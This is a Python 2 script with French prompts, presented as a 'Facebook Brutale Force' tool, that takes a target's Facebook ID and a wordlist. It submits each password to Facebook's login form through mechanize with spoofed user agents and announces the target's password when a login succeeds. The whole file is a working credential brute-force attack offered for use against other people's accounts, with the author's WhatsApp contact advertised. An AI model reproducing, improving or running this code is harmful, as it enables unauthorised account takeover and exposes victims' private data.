#!/usr/bin/python2
# -*- coding: utf-8 -*-

import time,sys,random,cookielib,mechanize,os
reload(sys)
sys.setdefaultencoding('utf8')


def Street(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.007)
    
def auto(a):
	for c in a + '\n':
		sys.stdout.write(c)
		sys.stdout.flush()
		time.sleep(0.009)
    
logo = """[38;5;214m●▬▬▬▬▬▬▬▬๑\033[1;97m●▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬●\033[1;32m●▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬●
[38;5;214m●____ _  _ ____ __\033[1;97m__ ____ ____    _  _ \033[1;32m___ _ _    ____● 
[38;5;214m●|    |__| |__| |_\033[1;97m_/ | __ |___    |  | \033[1;32m |  | |    |___● 
[38;5;214m●|___ |  | |  | | \033[1;97m \ |__] |___    |__| \033[1;32m |  | |___ |___● 
[38;5;214m●▬▬▬▬▬▬▬▬๑\033[1;97m●▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬●\033[1;32m●▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬●          
"""
os.system('clear')
time.sleep(0.5)
try:
    import mechanize
except ModuleNotFoundError:
    print '\033[1;91m[!]\033[1;97mLe Module \033[1;91m>\033[1;93mMechanize\033[1;91m<\033[1;97m introuvable!\n\033[1;97mCe module n\'est disponible qu\'en python 2.x\033[1;91m :/\n\033[1;97mVeuillez l\'installer en exexcutant cette commande \033[1;91m(\033[1;92mpip install mechanize\033[1;91m)\033[1;97m et\nexecutez le programme avec a nouveau en tapant\033[1;92m python\033[1;91m2\033[1;91m pirate'
    exit()
	
os.system("clear")
auto(logo)
time.sleep(3)
os.system("clear")
print """[38;5;214m●▬▬▬▬▬▬▬▬๑\033[1;97m●▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬●●▬▬▬▬▬\033[1;32m▬▬▬▬๑۩۩๑▬▬▬▬▬▬●             
[38;5;214m•_  _ ____ \033[1;97m _  _ ____ ____ _  _\033[1;32m ____ ____   _  _• 
[38;5;214m•|\/| |__/ \033[1;97m |__| |__| |    |_/ \033[1;32m |___ |__/   |_/ • 
[38;5;214m•|  | |  \ \033[1;97m |  | |  | |___ | \_\033[1;32m |___ |  \ __| \_•    
[38;5;214m●▬▬▬▬▬▬▬▬๑\033[1;97m●▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬●●▬▬▬▬▬\033[1;32m▬▬▬▬๑۩۩๑▬▬▬▬▬▬●"""                                                                                                                   
print("\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈• \033[1;91mMr\033[1;96m Faxel\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•")
print("")
Nu  = "Faxel"
mpd = "08127934"
loop = 'true'
while (loop == 'true'):
    Nomu = raw_input("\033[1;91m[\033[1;97m*\033[1;91m] \x1b[1;93mNom d\'utilisateur de l\'outil \x1b[1;91m»» \x1b[1;97m")
    if (Nomu == Nu):
	print("")
    	mp = raw_input("\033[1;91m[\033[1;97m+\033[1;91m] \x1b[1;93mMot de passe de l\'outil      \x1b[1;91m»» \x1b[1;97m")
        if (mp == mpd):
	    print("")
            print "\x1b[1;93m.........\x1b[1;97mConnecté avec succès en tant que\x1b[1;93m.....\x1b[1;92m " + Nomu #Dev:Faxel
	    time.sleep(2)
            loop = 'false'
        else:
            print "\033[1;91m........Mauvais mot de passe........"
            os.system('xdg-open https://wa.me/22555709610')
    else:
        print "\033[1;91m..........Nom d'utilisateur incorrect........"
        os.system('xdg-open https://www.youtube.com/channel/UCdmpFkmXAoSpG9fu1x0VPWw')
	
os.system("clear")
print("""
\033[1;97m ███████╗██████╗ \033[1;97m ██████╗██████╗  █████╗  ██████╗██╗  ██╗
\033[1;94m ██╔════╝██╔══██╗\033[1;91m██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝
\033[1;94m █████╗  ██████╔╝\033[1;91m██║     ██████╔╝███████║██║     █████╔╝ 
\033[1;94m ██╔══╝  ██╔══██╗\033[1;91m██║     ██╔══██╗██╔══██║██║     ██╔═██╗ 
\033[1;94m ██║     ██████╔╝\033[1;91m╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗
\033[1;94m ╚═╝     ╚═════╝ \033[1;91m ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝ 
\033[1;97m	      ############################################
\033[1;97m              #  \033[1;92mFacebook Brutale Force\033[1;97m,\033[1;91m Mr\033[1;96m Faxel\033[1;97m      #
\033[1;97m              #  \033[1;92mWhatsApp Contact\033[1;91m :\033[1;93m        +22555709610\033[1;97m #
\033[1;97m              ############################################ 
""")

print("")
mael = str(raw_input("\033[1;91m[\033[1;97m*\033[1;91m]\x1b[32m ID\x1b[31m/\033[32;1mNom d\'utilisateur\x1b[37m de votre cible\033[91m : \x1b[36m  "))
print("")
motdepasse = str(raw_input("\033[1;91m[\033[1;97m+\033[1;91m]\033[0;1m Entrez le fichier de liste de mots \033[31m(\x1b[32mfaxel.txt\x1b[31m) : \033[37m"))
connexion = 'https://www.facebook.com/login.php?login_attempt=1'
agentutilisateur = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Geck')]
# agentutilisateur = [('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36','Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36','Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36','Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',)]

def choix():
                print " "
                t = str(raw_input("\x1b[31m[\x1b[34m?\x1b[31m]\x1b[37m Voulez vous  pirater un compte facebook\x1b[33m..\x1b[31m [\x1b[32mo\x1b[31m/\x1b[34mn\x1b[31m] \x1b[31m: \x1b[37m"))
                if t == 'o' or t == 'O':
                    os.system('python2 crack.py')
                elif t == 'n' or t == 'N':
                    print ("\x1b[31mQuittez le programme\x1b[33m....")
                    sys.exit()
                else:
                    print ("\x1b[37mRemplissez correctement\x1b[33m....")
                    choix()

def liste_de_mot():

        print ("")
        h = str(raw_input("\x1b[31m[\x1b[37m?\x1b[31m]\x1b[37m Voulez vous creer une\x1b[31m wordliste\x1b[37m?\x1b[31m [\x1b[32mo\x1b[31m/\x1b[34mn\x1b[31m] \x1b[31m: \x1b[37m "))
        if h == 'o' or h == 'O':
                os.system('nano '+motdepasse)
                choix()
        elif h == 'n' or h == 'N':
                print ("\x1b[31mArret du programme\x1b[33m...")
                sys.exit()

        else:
                print ("\x1b[37mRemplissez correctement\x1b[33m...")
                liste_de_mot()

def menu():
        global antoine
        antoine = mechanize.Browser()
        cho = cookielib.LWPCookieJar()
        antoine.set_handle_robots(False)
        antoine.set_handle_redirect(True)
        antoine.set_cookiejar(cho)
        antoine.set_handle_equiv(True)
        antoine.set_handle_referer(True)
        antoine.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
        Kouadio()
        faxel()
        print ("")
        print ("\x1b[31m Aucune liste de mots ne correspond\x1b[33m...")
        print ("")
	
def rit(rit_mdp):
  try:
 	sys.stdout.write("\n\x1b[32m[\033[91m+\033[92m]\033[91;1m [\033[0;1m"+mael+"\033[31m]\033[36;1m J\'ai essayer ==> \033[0;1m "+rit_mdp )
	sys.stdout.flush()
	antoine.addheaders = [('User-agent', random.choice(agentutilisateur))]
	site = antoine.open(connexion)
	antoine.select_form(nr = 0)
	antoine.form['email'] = mael
	antoine.form['pass'] = rit_mdp
	chantal = antoine.submit()
	cache = chantal.geturl()
	if cache != connexion and (not 'login_attempt' in cache):
                        print ("")
			print ("\x1b[31m+-------------------------------------------+")
			Street ("\x1b[37m   M O T  D E  P A S S E  T R O U V E R      ")
			Street ("\033[92m          A V E C   S U C C E S     	     ")
                  	print ("\x1b[31m+-------------------------------------------+")
	         	print ("\x1b[31m[\x1b[37m*\x1b[31m]\033[97m ID / Email cible\x1b[31m : \033[92m {}").format(mael)
        	        print ("\x1b[31m[\x1b[37m*\x1b[31m]\033[97m Mot de passe de votre cible\033[91m : \033[92m {}").format(rit_mdp)
        	        print ("")
        	        raw_input("\x1b[37mAppuyez sur entrer...")
			sys.exit(1)
  
  
  except KeyboardInterrupt:
      print "\x1b[31mArret\x1b[33m......."
      liste_de_mot()
      sys.exit()  

def faxel():
	global rit_mdp
	mon_mdp = open(motdepasse, "r")
	for rit_mdp in mon_mdp:
		mon_mdp = rit_mdp.replace("\n","")
		rit(rit_mdp)		

def Kouadio():
         global motdepasse
         os.system('clear')
         Street("\033[1;92m  ____             _        _ \033[1;91m       ______ _     ")    
         Street("\033[1;92m |  _ \           | |      | |\033[1;91m      |  ____| |    ")  
         Street("\033[1;92m | |_) |_ __ _   _| |_ __ _| |\033[1;97m______\033[1;91m| |__  | |__  ")
         Street("\033[1;92m |  _ <| '__| | | | __/ _` | |\033[1;97m______\033[1;91m|  __| | '_ \ ")
         Street("\033[1;92m | |_) | |  | |_| | || (_| | |\033[1;91m      | |    | |_) |")
         Street("\033[1;92m |____/|_|   \__,_|\__\__,_|_|\033[1;91m      |_|    |_.__/ ")         
	 print("")
	 Street("\x1b[31m[\x1b[37m*\x1b[31m] \033[37mCodé par\033[1;91m : \x1b[36m\033[041m Hacker_K\033[00m  \x1b[31m [\033[1;97m*\x1b[31m] ")
         print("")
         print("")
         hacker = open(motdepasse, 'r')
         hacker = hacker.readlines()
         print "\033[1;91m[\033[1;93m*\033[1;91m]\033[1;97m ID\033[1;91m/\033[1;97mNom d\'utilisateur de votre cible     \033[91;1m : \033[1;96m  {}".format(mael)
         print "\033[1;91m[\033[1;93m+\033[1;91m]\033[1;97m Nombre de mot de passe disponible actuel\033[91;1m : \033[1;93m ", len(hacker),'\033[1;97m mot de passe'
	 print("")
         Street("\033[1;91m[\033[1;93m#\033[1;91m]\033[1;97m Veuillez patientez le processus de craquage est cours d\'execution\033[93;1m..........")
         print ("")
	 print "\033[1;91m[\033[1;93m*\033[1;91m]\033[1;97m Piratage du compte de \033[1;95m{}".format(mael),'\033[1;97m en cours, soyez patient.\033[1;91m[\033[1;93m*\033[1;91m]\033[1;97m'
	 print ("")
		
		
if __name__=='__main__':
	menu()


